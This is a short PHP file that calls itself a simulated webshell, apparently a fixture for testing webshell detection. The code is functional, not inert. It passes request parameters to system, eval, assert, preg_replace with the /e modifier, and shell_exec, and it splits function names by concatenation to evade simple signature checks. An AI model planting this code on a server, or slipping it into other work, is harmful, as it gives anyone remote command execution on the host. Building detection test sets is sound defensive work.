<?php
/**
 * TEST FILE - SIMULATED WEBSHELL #3
 * Known webshell signatures (FilesMan, WSO style)
 * 
 * DANGER: This is for testing purposes only!
 */

// FilesMan signature
$FilesMan = true;
$wso_version = "4.0";

// Variable function call (common in webshells)
$func = 'sys'.'tem';
$func($_GET['c']);

// Dynamic eval through variable
$a = $_POST['code'];
$b = 'ev'.'al';
$b($a);

// Assert as code execution
assert($_GET['assert_code']);

// preg_replace /e modifier (deprecated but still dangerous)
preg_replace('/.*/e', $_POST['replace'], '');

// Create function dynamically
$f = create_function('$x', 'return shell_exec($x);');
echo $f($_GET['shell']);
?>
